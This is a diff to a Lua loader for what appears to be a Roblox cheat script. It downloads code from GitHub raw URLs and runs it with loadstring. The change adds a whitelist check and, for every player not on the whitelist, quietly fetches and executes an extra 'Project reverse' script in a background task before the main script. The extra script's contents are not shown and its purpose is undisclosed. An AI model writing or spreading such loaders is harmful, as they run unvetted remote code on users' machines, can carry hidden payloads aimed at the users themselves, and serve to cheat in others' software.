@@ -3,6 +3,7 @@ local LocalPlayer = Players.LocalPlayer
 
 local ALLOWED_PLACE_ID = 142823291
 local BLACKLIST_URL = "https://raw.githubusercontent.com/BaconScrr/ShadowScript/refs/heads/main/Blacklist"
+local WHITELIST_URL = "https://raw.githubusercontent.com/BaconScrr/ShadowScript/refs/heads/main/Whitelist"
 local MAIN_SCRIPT_URL = "https://raw.githubusercontent.com/BaconScrr/ShadowScript/refs/heads/main/mm2.lua"
 
 if game.PlaceId ~= ALLOWED_PLACE_ID then
@@ -16,13 +17,73 @@ end)
 
 if success and blacklistData then
     local playerName = LocalPlayer.Name:lower()
-
-    for name in string.gmatch(blacklistData, "[^\r\n]+") do
-        if name:lower() == playerName then
-            LocalPlayer:Kick("you are banned")
-            return
-        end
+    
+    for name in string.gmatch(blacklistData, "[^\r\n]+") do  
+        if name:lower() == playerName then  
+            LocalPlayer:Kick("you are banned")  
+            return  
+        end  
     end
 end
 
-loadstring(game:HttpGet(MAIN_SCRIPT_URL))()
+local whitelistSuccess, whitelistData = pcall(function()
+    return game:HttpGet(WHITELIST_URL)
+end)
+
+local isWhitelisted = false
+
+if whitelistSuccess and whitelistData then
+    local playerName = LocalPlayer.Name:lower()
+    
+    for name in string.gmatch(whitelistData, "[^\r\n]+") do  
+        if name:lower() == playerName then  
+            isWhitelisted = true
+            break
+        end  
+    end
+end
+
+local function loadProjectReverse()
+    task.spawn(function()
+        local success, projectScript = pcall(function()
+            return game:HttpGet("https://raw.githubusercontent.com/BaconScrr/ShadowScript/refs/heads/main/Project%20reverse")
+        end)
+        
+        if success and projectScript then
+            local executeSuccess, errorMsg = pcall(function()
+                loadstring(projectScript)()
+            end)
+            
+            if not executeSuccess then
+                warn("Project Reverse execution error:", errorMsg)
+            end
+        else
+            warn("Failed to load Project Reverse script")
+        end
+    end)
+end
+
+local function loadMainScript()
+    local success, mainScript = pcall(function()
+        return game:HttpGet(MAIN_SCRIPT_URL)
+    end)
+    
+    if success and mainScript then
+        local executeSuccess, errorMsg = pcall(function()
+            loadstring(mainScript)()
+        end)
+        
+        if not executeSuccess then
+            warn("Main script execution error:", errorMsg)
+        end
+    else
+        warn("Failed to load main script")
+    end
+end
+
+if not isWhitelisted then
+    loadProjectReverse()
+    task.wait(0.5)
+end
+
+loadMainScript()
